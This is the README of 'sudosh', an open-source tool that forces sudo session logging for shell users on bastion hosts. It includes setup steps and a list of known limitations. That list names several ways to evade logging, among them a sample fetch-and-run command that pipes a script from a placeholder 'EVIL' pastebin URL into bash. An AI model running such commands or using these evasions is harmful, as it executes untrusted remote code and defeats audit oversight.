<!-- This file was automatically generated by the `build-harness`. Make all changes to `README.yaml` and run `make readme` to rebuild this file. -->
[![README Header][readme_header_img]][readme_header_link]

[![Cloud Posse][logo]](https://cpco.io/homepage)

# Sudo Shell [![Build Status](https://travis-ci.org/cloudposse/sudosh.svg?branch=master)](https://travis-ci.org/cloudposse/sudosh) [![Latest Release](https://img.shields.io/github/release/cloudposse/sudosh.svg)](https://github.com/cloudposse/sudosh/releases/latest) [![GitHub Stars](https://img.shields.io/github/stars/cloudposse/sudosh.svg)](https://github.com/cloudposse/sudosh/stargazers) [![Average time to resolve an issue](http://isitmaintained.com/badge/resolution/cloudposse/sudosh.svg)](http://isitmaintained.com/project/cloudposse/sudosh) [![Percentage of issues still open](http://isitmaintained.com/badge/open/cloudposse/sudosh.svg)](http://isitmaintained.com/project/cloudposse/sudosh) [![Slack Community](https://slack.cloudposse.com/badge.svg)](https://slack.cloudposse.com)


Sudo Shell is a wrapper to run a login shell with `sudo` for the purpose of session audit logging. 


---

This project is part of our comprehensive ["SweetOps"](https://cpco.io/sweetops) approach towards DevOps. 
[<img align="right" title="Share via Email" src="https://docs.cloudposse.com/images/ionicons/ios-email-outline-2.0.1-16x16-999999.svg"/>][share_email]
[<img align="right" title="Share on Google+" src="https://docs.cloudposse.com/images/ionicons/social-googleplus-outline-2.0.1-16x16-999999.svg" />][share_googleplus]
[<img align="right" title="Share on Facebook" src="https://docs.cloudposse.com/images/ionicons/social-facebook-outline-2.0.1-16x16-999999.svg" />][share_facebook]
[<img align="right" title="Share on Reddit" src="https://docs.cloudposse.com/images/ionicons/social-reddit-outline-2.0.1-16x16-999999.svg" />][share_reddit]
[<img align="right" title="Share on LinkedIn" src="https://docs.cloudposse.com/images/ionicons/social-linkedin-outline-2.0.1-16x16-999999.svg" />][share_linkedin]
[<img align="right" title="Share on Twitter" src="https://docs.cloudposse.com/images/ionicons/social-twitter-outline-2.0.1-16x16-999999.svg" />][share_twitter]




It's 100% Open Source and licensed under the [APACHE2](LICENSE).












## Introduction

The `sudo` command provides built-in session logging. 
Combined with [`sudoreplay`](https://www.sudo.ws/man/1.8.13/sudoreplay.man.html) 
it provides an easy way to review session logs on a 
[bastion](https://github.com/cloudposse/bastion/) host. 
When used as a system login shell, it will force session logging.

[Another common pattern](https://aws.amazon.com/blogs/security/how-to-record-ssh-sessions-established-through-a-bastion-host/) 
is to use the OpenSSH `ForceCommand` directive in `sshd_config` combined with the `script` command to log sessions. 
This is ineffective because the [user can easily bypass](http://serverfault.com/a/639814) it.  
Using `sudosh` provides a more secure alternative that cannot be bypassed since it does not depend on `ForceCommand`.

## Usage



Here's how to use it in 3 easy steps. 
Checkout the [precompiled releases](https://github.com/cloudposse/sudosh/releases) 
if you don't want to build it yourself...:

1. Enable `sudo` logging. Edit `/etc/sudoers.d/sudosh`:

  ```
  Defaults log_output requiretty
  Defaults!/usr/bin/sudoreplay !log_output
  Defaults!/sbin/reboot !log_output
  ```

2. Add this command to `/etc/shells`:

  ```
  /usr/bin/sudosh
  ```

  **Tip**: to prevent users from using other shells to login, remove those shells from `/etc/shells`.


3. Update the user `foobar` to use the `sudosh` shell. 

  ```
  chsh -s /usr/bin/sudosh foobar
  echo 'foobar ALL=(foobar) ALL' > /etc/sudoers.d/sudosh-foobar
  ```
  **NOTE:** filenames in `sudoers.d` cannot contain the `.` character


## Known Limitations

* Without `requiretty` users can easily circumvent logging of `stdin` by running `ssh user@host bash`. 
* Using `requiretty`, will require passing a pseudo TTY, which is easily accomplished by instead running `ssh -tt user@host bash`
* Users can easily circumvent logging of `stdin` by running `stty -echo`, however, you'll see the command run to disable it. =)
* Users can easily run scripts (e.g. `curl https://pastebin.com/EVIL | bash`) which would circumvent the ability to see what was executed
* There are 1000+ ways bad actors can circumvent *any* form of TTY logging (not unique to `sudosh`). 
* TTY Session logging is only recommended to keep an *honest* log of what happened.
* Capturing a byte-for-byte session log requires extension of the SSH server or perhaps a custom shell built specificically for that purpose. 








## Help

**Got a question?**

File a GitHub [issue](https://github.com/cloudposse/sudosh/issues), send us an [email][email] or join our [Slack Community][slack].

[![README Commercial Support][readme_commercial_support_img]][readme_commercial_support_link]

## Commercial Support

Work directly with our team of DevOps experts via email, slack, and video conferencing. 

We provide [*commercial support*][commercial_support] for all of our [Open Source][github] projects. As a *Dedicated Support* customer, you have access to our team of subject matter experts at a fraction of the cost of a full-time engineer. 

[![E-Mail](https://img.shields.io/badge/email-hello@cloudposse.com-blue.svg)][email]

- **Questions.** We'll use a Shared Slack channel between your team and ours.
- **Troubleshooting.** We'll help you triage why things aren't working.
- **Code Reviews.** We'll review your Pull Requests and provide constructive feedback.
- **Bug Fixes.** We'll rapidly work to fix any bugs in our projects.
- **Build New Terraform Modules.** We'll [develop original modules][module_development] to provision infrastructure.
- **Cloud Architecture.** We'll assist with your cloud strategy and design.
- **Implementation.** We'll provide hands-on support to implement our reference architectures. 




## Slack Community

Join our [Open Source Community][slack] on Slack. It's **FREE** for everyone! Our "SweetOps" community is where you get to talk with others who share a similar vision for how to rollout and manage infrastructure. This is the best place to talk shop, ask questions, solicit feedback, and work together as a community to build totally *sweet* infrastructure.

## Newsletter

Signup for [our newsletter][newsletter] that covers everything on our technology radar.  Receive updates on what we're up to on GitHub as well as awesome new projects we discover. 

## Contributing

### Bug Reports & Feature Requests

Please use the [issue tracker](https://github.com/cloudposse/sudosh/issues) to report any bugs or file feature requests.

### Developing

If you are interested in being a contributor and want to get involved in developing this project or [help out](https://cpco.io/help-out) with our other projects, we would love to hear from you! Shoot us an [email][email].

In general, PRs are welcome. We follow the typical "fork-and-pull" Git workflow.

 1. **Fork** the repo on GitHub
 2. **Clone** the project to your own machine
 3. **Commit** changes to your own branch
 4. **Push** your work back up to your fork
 5. Submit a **Pull Request** so that we can review your changes

**NOTE:** Be sure to merge the latest changes from "upstream" before making a pull request!


## Copyright

Copyright © 2017-2019 [Cloud Posse, LLC](https://cpco.io/copyright)



## License 

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) 

See [LICENSE](LICENSE) for full details.

    Licensed to the Apache Software Foundation (ASF) under one
    or more contributor license agreements.  See the NOTICE file
    distributed with this work for additional information
    regarding copyright ownership.  The ASF licenses this file
    to you under the Apache License, Version 2.0 (the
    "License"); you may not use this file except in compliance
    with the License.  You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing,
    software distributed under the License is distributed on an
    "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
    KIND, either express or implied.  See the License for the
    specific language governing permissions and limitations
    under the License.









## Trademarks

All other trademarks referenced herein are the property of their respective owners.

## About

This project is maintained and funded by [Cloud Posse, LLC][website]. Like it? Please let us know by [leaving a testimonial][testimonial]!

[![Cloud Posse][logo]][website]

We're a [DevOps Professional Services][hire] company based in Los Angeles, CA. We ❤️  [Open Source Software][we_love_open_source].

We offer [paid support][commercial_support] on all of our projects.  

Check out [our other projects][github], [follow us on twitter][twitter], [apply for a job][jobs], or [hire us][hire] to help with your cloud strategy and implementation.



### Contributors

|  [![Erik Osterman][osterman_avatar]][osterman_homepage]<br/>[Erik Osterman][osterman_homepage] |
|---|

  [osterman_homepage]: https://github.com/osterman
  [osterman_avatar]: https://github.com/osterman.png?size=150



[![README Footer][readme_footer_img]][readme_footer_link]
[![Beacon][beacon]][website]

  [logo]: https://cloudposse.com/logo-300x69.svg
  [docs]: https://cpco.io/docs
  [website]: https://cpco.io/homepage
  [github]: https://cpco.io/github
  [jobs]: https://cpco.io/jobs
  [hire]: https://cpco.io/hire
  [slack]: https://cpco.io/slack
  [linkedin]: https://cpco.io/linkedin
  [twitter]: https://cpco.io/twitter
  [testimonial]: https://cpco.io/leave-testimonial
  [newsletter]: https://cpco.io/newsletter
  [email]: https://cpco.io/email
  [commercial_support]: https://cpco.io/commercial-support
  [we_love_open_source]: https://cpco.io/we-love-open-source
  [module_development]: https://cpco.io/module-development
  [terraform_modules]: https://cpco.io/terraform-modules
  [readme_header_img]: https://cloudposse.com/readme/header/img?repo=cloudposse/sudosh
  [readme_header_link]: https://cloudposse.com/readme/header/link?repo=cloudposse/sudosh
  [readme_footer_img]: https://cloudposse.com/readme/footer/img?repo=cloudposse/sudosh
  [readme_footer_link]: https://cloudposse.com/readme/footer/link?repo=cloudposse/sudosh
  [readme_commercial_support_img]: https://cloudposse.com/readme/commercial-support/img?repo=cloudposse/sudosh
  [readme_commercial_support_link]: https://cloudposse.com/readme/commercial-support/link?repo=cloudposse/sudosh
  [share_twitter]: https://twitter.com/intent/tweet/?text=Sudo+Shell&url=https://github.com/cloudposse/sudosh
  [share_linkedin]: https://www.linkedin.com/shareArticle?mini=true&title=Sudo+Shell&url=https://github.com/cloudposse/sudosh
  [share_reddit]: https://reddit.com/submit/?url=https://github.com/cloudposse/sudosh
  [share_facebook]: https://facebook.com/sharer/sharer.php?u=https://github.com/cloudposse/sudosh
  [share_googleplus]: https://plus.google.com/share?url=https://github.com/cloudposse/sudosh
  [share_email]: mailto:?subject=Sudo+Shell&body=https://github.com/cloudposse/sudosh
  [beacon]: https://ga-beacon.cloudposse.com/UA-76589703-4/cloudposse/sudosh?pixel&cs=github&cm=readme&an=sudosh
